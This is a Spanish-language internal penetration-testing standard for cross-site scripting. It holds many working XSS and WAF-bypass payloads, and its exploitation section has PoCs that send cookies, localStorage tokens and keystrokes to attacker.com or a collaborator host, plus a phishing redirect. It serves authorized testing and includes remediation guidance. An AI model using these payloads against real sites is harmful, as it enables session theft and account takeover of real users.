# 🔐 Estándar de Pentesting — XSS (Cross-Site Scripting)

> **Versión:** 1.0  
> **Clasificación:** Uso interno — LokiTrace Tools  
> **Referencia:** OWASP TOP 10 – A03:2021 Injection  
> **Autor:** LokiTrace Security Team  
> **Última revisión:** 2026-05-18

---

## 📌 Índice

1. [¿Qué es XSS?](#1-qué-es-xss)
2. [Tipos de XSS y severidad](#2-tipos-de-xss-y-severidad)
3. [Prerrequisitos y alcance](#3-prerrequisitos-y-alcance)
4. [Fase 1 — Reconocimiento y mapeo de puntos de entrada](#4-fase-1--reconocimiento-y-mapeo-de-puntos-de-entrada)
5. [Fase 2 — Pruebas de XSS Reflected](#5-fase-2--pruebas-de-xss-reflected)
6. [Fase 3 — Pruebas de XSS Stored](#6-fase-3--pruebas-de-xss-stored)
7. [Fase 4 — Pruebas de XSS DOM-Based](#7-fase-4--pruebas-de-xss-dom-based)
8. [Fase 5 — Bypass de filtros y WAF](#8-fase-5--bypass-de-filtros-y-waf)
9. [Fase 6 — Explotación y PoC de impacto real](#9-fase-6--explotación-y-poc-de-impacto-real)
10. [Fase 7 — Documentación del hallazgo](#10-fase-7--documentación-del-hallazgo)
11. [Checklist de ejecución](#11-checklist-de-ejecución)
12. [Referencias](#12-referencias)

---

## 1. ¿Qué es XSS?

**Cross-Site Scripting (XSS)** ocurre cuando una aplicación incluye datos no confiables en una página web sin la validación y codificación adecuadas, permitiendo a un atacante ejecutar scripts maliciosos en el navegador de la víctima.

### Ejemplo básico

```html
URL: https://target.com/search?q=<script>alert(1)</script>
Respuesta: <p>Resultados para: <script>alert(1)</script></p>
```

---

## 2. Tipos de XSS y severidad

| Tipo             | Persiste | Quién es víctima          | Severidad       |
|------------------|----------|---------------------------|-----------------|
| **Reflected**    | ❌ No    | Quien hace clic en el link | 🟠 Medio-Alto  |
| **Stored**       | ✅ Sí    | Todos los que ven la página | 🔴 Crítico     |
| **DOM-Based**    | ❌/✅    | Depende del sink           | 🔴 Alto-Crítico|
| **Blind**        | ✅ Sí    | Usuarios internos / admins | 🔴 Crítico     |

---

## 3. Prerrequisitos y alcance

### Herramientas requeridas
- [ ] **Burp Suite** (Proxy + Repeater + Scanner)
- [ ] **Browser DevTools** (consola, inspector de DOM)
- [ ] **XSStrike** (fuzzer especializado en XSS)
- [ ] **Dalfox** (XSS scanner automatizado)
- [ ] **Burp Collaborator / interactsh** (para XSS blind)
- [ ] Extensión Burp: **Reflected Parameters**

```bash
# Instalar herramientas
pip install xsstrike
go install github.com/hahwul/dalfox/v2@latest
```

---

## 4. Fase 1 — Reconocimiento y mapeo de puntos de entrada

**Objetivo:** Identificar todos los puntos donde datos controlados por el usuario se reflejan o almacenan.

### 4.1 Categorías de puntos de entrada

| Categoría               | Ejemplos concretos                                           |
|-------------------------|--------------------------------------------------------------|
| Parámetros GET/POST     | `?q=`, `?name=`, `?search=`, `?message=`                    |
| Campos de formulario    | login, registro, comentarios, búsqueda, perfil de usuario   |
| Headers HTTP            | `User-Agent`, `Referer`, `X-Forwarded-For`, `Accept-Language`|
| JSON en request body    | `{"name": "...", "bio": "...", "title": "..."}`              |
| Fragmento URL (#)       | `https://target.com/app#section=PAYLOAD` (DOM-based)        |
| Subidas de archivo      | nombre del archivo reflejado en la UI                        |
| Campos de búsqueda      | autocompletar, filtros, resultados en tiempo real            |

### 4.2 Clasificar el contexto de reflexión

Antes de enviar payloads, identificar el contexto HTML donde se refleja la entrada:

```html
<!-- Contexto 1: HTML body (entre tags) -->
<p>Hola, PAYLOAD</p>

<!-- Contexto 2: Atributo HTML -->
<input value="PAYLOAD" type="text">

<!-- Contexto 3: Dentro de un atributo de evento -->
<img src="x" onerror="PAYLOAD">

<!-- Contexto 4: Dentro de JavaScript -->
<script>var user = "PAYLOAD";</script>

<!-- Contexto 5: Dentro de URL en href/src -->
<a href="PAYLOAD">click</a>

<!-- Contexto 6: Dentro de CSS -->
<style>body { background: PAYLOAD }</style>
```

---

## 5. Fase 2 — Pruebas de XSS Reflected

### 5.1 Payload de detección inicial (canary string)

```bash
# Enviar un canary string único para rastrear reflexión
CANARY="loki12345xss"
curl -s "https://target.com/search?q=$CANARY" | grep -o "$CANARY"
```

### 5.2 Payloads básicos por contexto

**Contexto HTML body:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
```

**Contexto atributo HTML (romper el atributo):**
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onclick='alert(1)
```

**Contexto JavaScript (escapar el string):**
```javascript
"-alert(1)-"
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

**Contexto href/src (javascript: URI):**
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### 5.3 Automatización con Dalfox

```bash
# Escaneo de un endpoint
dalfox url "https://target.com/search?q=test" \
  --cookie "session=TOKEN" \
  --blind "https://tu-collaborator.oast.me"

# Múltiples URLs desde archivo
dalfox file urls.txt \
  --cookie "session=TOKEN" \
  -o resultados_xss.txt

# Pipeline con waybackurls
waybackurls target.com | dalfox pipe --cookie "session=TOKEN"
```

### 5.4 XSStrike

```bash
# Escaneo básico
python3 xsstrike.py -u "https://target.com/search?q=test"

# Con crawling
python3 xsstrike.py -u "https://target.com" --crawl --blind

# Solo POST
python3 xsstrike.py -u "https://target.com/api/submit" \
  --data '{"name":"test","comment":"FUZZ"}' \
  --headers "Authorization: Bearer TOKEN"
```

---

## 6. Fase 3 — Pruebas de XSS Stored

### 6.1 Puntos de almacenamiento a probar

```
- Comentarios / reviews / posts en foros
- Nombre y apellido en perfil de usuario
- Bio / descripción / "acerca de"
- Nombres de archivos al subir documentos
- Campos de dirección, empresa, cargo
- Mensajes internos / notificaciones
- Títulos de tickets / incidencias
- Campos de configuración (nombre de la empresa, etc.)
```

### 6.2 Procedimiento de prueba

```bash
# 1. Inyectar payload en el campo sospechoso
POST /api/profile
{
  "display_name": "<img src=x onerror=alert(document.domain)>",
  "bio": "\"onmouseover=\"alert(1)\""
}

# 2. Navegar a la página donde se renderiza el dato
GET /users/profile/123

# 3. Verificar si el script se ejecuta
# ¿Aparece el alert? ¿Aparece el payload sin sanitizar en el HTML fuente?
```

### 6.3 Payload de XSS Blind (Stored sin reflexión visible)

```html
<!-- Payload para exfiltrar datos cuando un admin lo vea -->
<script src="https://tu-collaborator.oast.me/xss.js"></script>

<!-- Payload inline para capturar cookies -->
<img src=x onerror="fetch('https://tu-collaborator.oast.me/?c='+document.cookie)">

<!-- Capturar el DOM completo -->
<script>
  fetch('https://tu-collaborator.oast.me/', {
    method: 'POST',
    body: JSON.stringify({
      url: location.href,
      cookies: document.cookie,
      dom: document.documentElement.innerHTML.substring(0, 3000)
    })
  });
</script>
```

---

## 7. Fase 4 — Pruebas de XSS DOM-Based

### 7.1 Fuentes (Sources) peligrosas

```javascript
// Datos controlados por el atacante en el DOM
document.URL
document.location
document.location.href
document.location.hash     // Fragmento #
document.location.search   // Query string ?
document.referrer
window.name
location.pathname
```

### 7.2 Sinks (destinos) peligrosos

```javascript
// Funciones/propiedades que ejecutan código
document.write()
document.writeln()
innerHTML
outerHTML
eval()
setTimeout("string")
setInterval("string")
new Function("string")
element.src
location.href = "javascript:..."
$.html()  // jQuery
```

### 7.3 Identificar DOM XSS manualmente

```javascript
// En la consola del navegador, buscar el flujo:
// 1. ¿De dónde viene el dato?
location.hash          // si el hash se usa directamente

// 2. ¿A dónde va el dato?
document.getElementById('output').innerHTML = location.hash.slice(1)

// 3. Payload de prueba:
// https://target.com/app#<img src=x onerror=alert(1)>
```

### 7.4 DOM Invader (Burp Suite)

1. Activar **DOM Invader** en el Chromium de Burp.
2. Navegar por la aplicación.
3. DOM Invader rastrea automáticamente el flujo source → sink.
4. Genera payloads específicos para cada contexto.

---

## 8. Fase 5 — Bypass de filtros y WAF

### 8.1 Técnicas de evasión

**Variaciones de la etiqueta `<script>`:**
```html
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
<script >alert(1)</script>
```

**Sin comillas y sin espacios:**
```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

**Encodings:**
```html
<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Unicode escape en JS -->
\u0061\u006C\u0065\u0072\u0074(1)

<!-- Base64 en data URI -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

**Políglotas (funcionan en múltiples contextos):**
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### 8.2 Evasión específica de WAF

```bash
# Probar si el WAF bloquea por keyword
# Si bloquea "alert", probar alternativas:
confirm(1)
prompt(1)
console.log(1)
alert`1`        # tagged template literal
(alert)(1)
a=alert,a(1)

# Si bloquea "script", usar eventos:
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
```

---

## 9. Fase 6 — Explotación y PoC de impacto real

> ⚠️ Solo ejecutar en entornos con autorización. El objetivo es demostrar el impacto real al cliente.

### 9.1 Robo de cookies de sesión

```javascript
// Exfiltrar cookie a servidor controlado
document.write('<img src="https://attacker.com/steal?c='+document.cookie+'" />')

// Usando fetch (más silencioso)
fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))
```

### 9.2 Robo de token almacenado en localStorage

```javascript
fetch('https://attacker.com/steal?t='+encodeURIComponent(localStorage.getItem('auth_token')))
```

### 9.3 Keylogger básico (PoC)

```javascript
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/keys?k='+encodeURIComponent(e.key));
});
```

### 9.4 Redirigir a phishing

```javascript
window.location = 'https://attacker.com/fake-login'
```

### 9.5 Realizar acciones en nombre de la víctima (CSRF via XSS)

```javascript
// Cambiar email del usuario autenticado
fetch('/api/profile', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({email: 'attacker@evil.com'})
});
```

---

## 10. Fase 7 — Documentación del hallazgo

### 📄 Plantilla de reporte de XSS

```markdown
## Hallazgo: XSS [Tipo] en [endpoint/campo]

**ID del hallazgo:** XSS-001
**Fecha:** YYYY-MM-DD
**Severidad:** Crítica / Alta / Media / Baja
**Tipo:** Reflected / Stored / DOM-Based
**CVSS Score:** (https://www.first.org/cvss/calculator/3.1)

### Descripción
[Descripción del problema y contexto de reflexión]

### Endpoint / Campo afectado
`GET /search?q=PAYLOAD`
Campo: "Nombre de usuario" en /api/profile

### Payload utilizado
```html
<svg onload=alert(document.domain)>
```

### Pasos para reproducir
1. Navegar a: `https://target.com/search?q=<svg onload=alert(document.domain)>`
2. Observar la ejecución del script en el navegador.

### Evidencia
- Captura de pantalla del alert/ejecución
- Request y response en Burp

### Impacto
- Robo de cookies de sesión → account takeover
- Ejecución de acciones en nombre del usuario
- Desfiguración de la página para usuarios víctimas

### Remediación recomendada
- Encodear la salida según el contexto (HTML, JS, URL, CSS)
- Implementar Content Security Policy (CSP) estricta
- Usar `HttpOnly` en cookies para prevenir robo via XSS
- Validar y sanitizar toda entrada con biblioteca probada (DOMPurify)
- Evitar el uso de `innerHTML`, `document.write()`, `eval()`
```

---

## 11. Checklist de ejecución

### ✅ Reconocimiento
- [ ] Todos los puntos de entrada mapeados (GET, POST, headers, JSON)
- [ ] Contexto de reflexión identificado por cada punto (HTML, JS, atributo, URL)
- [ ] Herramientas configuradas (Burp, Dalfox, DOM Invader)

### ✅ XSS Reflected
- [ ] Canary string enviado para confirmar reflexión
- [ ] Payloads básicos probados por contexto
- [ ] Escaneo automático con Dalfox o XSStrike

### ✅ XSS Stored
- [ ] Todos los campos de almacenamiento probados
- [ ] Payload inyectado y renderización verificada
- [ ] Payload blind configurado con servidor de captura

### ✅ XSS DOM-Based
- [ ] Sources (location, hash, etc.) identificadas
- [ ] Sinks (innerHTML, eval, etc.) identificados
- [ ] DOM Invader activado y analizado
- [ ] Payload vía fragmento URL (#) probado

### ✅ Bypass de filtros
- [ ] Variaciones de capitalización probadas
- [ ] Payloads HTML encoded probados
- [ ] Alternativas a `alert()` probadas
- [ ] Políglotas probados si hay filtros agresivos

### ✅ Explotación (PoC)
- [ ] PoC de impacto real preparado (robo de cookie / token)
- [ ] Alcance del impacto documentado (¿qué puede hacer el atacante?)

### ✅ Documentación
- [ ] Request/Response capturada con evidencia
- [ ] Tipo de XSS y contexto documentados
- [ ] Remediación específica incluida (CSP, encoding por contexto)
- [ ] CVSS calculado

---

## 12. Referencias

| Recurso                                    | URL                                                                                          |
|--------------------------------------------|----------------------------------------------------------------------------------------------|
| OWASP XSS                                  | https://owasp.org/www-community/attacks/xss/                                                 |
| OWASP XSS Prevention Cheat Sheet           | https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html |
| PortSwigger – XSS                          | https://portswigger.net/web-security/cross-site-scripting                                    |
| XSS Payload List (PayloadAllTheThings)     | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection             |
| Dalfox                                     | https://github.com/hahwul/dalfox                                                             |
| XSStrike                                   | https://github.com/s0md3v/XSStrike                                                           |
| CSP Evaluator                              | https://csp-evaluator.withgoogle.com/                                                        |
| DOMPurify (sanitización)                   | https://github.com/cure53/DOMPurify                                                          |

---

> 📁 **Serie de estándares:** `ESTANDAR_IDOR.md` | `ESTANDAR_BROKEN_AUTH.md` | **`ESTANDAR_XSS.md`** | `ESTANDAR_SQLI.md`
